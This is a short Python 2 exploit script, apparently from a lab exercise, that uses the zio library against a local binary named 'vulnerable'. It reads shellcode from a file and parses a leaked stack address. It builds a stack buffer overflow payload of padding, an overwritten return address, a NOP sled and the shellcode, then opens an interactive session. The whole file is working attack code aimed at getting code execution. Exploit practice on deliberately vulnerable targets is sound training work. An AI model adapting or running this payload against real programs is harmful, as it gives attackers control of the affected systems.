#!/usr/bin/env python
# coding:utf-8

from zio import *
import sys
import binascii

if len(sys.argv) != 2:
    print "Usage : "
    print "        python exploit.py [SHELLCODE_FILE]"
    exit(1)

# objdump -d shellcode (not working)
filename = sys.argv[1]
with open(filename) as f:
    shellcode = f.read()

print "=" * 16
print "[SHELLCODE] : %s" % (binascii.b2a_hex(shellcode))
print "[LENGTH] : %d" % (len(shellcode))
print "=" * 16

#Io = zio("../vulnerable/vulnerable")
Io = zio("../vulnerable/vulnerable")

# python -c 'print "A" * 8 + "BBBBCCCCDDDD" + "@@@@"' | ./vulnerable
junk = "A" * 16 + "BBBBCCCC"
nop = "\x90" * 64

address = l64(int(Io.readline()[2:-1], 16) + len(junk) + 32)
print binascii.b2a_hex(address)
payload = junk + address + nop + shellcode

Io.write(payload)
print ""
print "=" * 16
Io.interact()
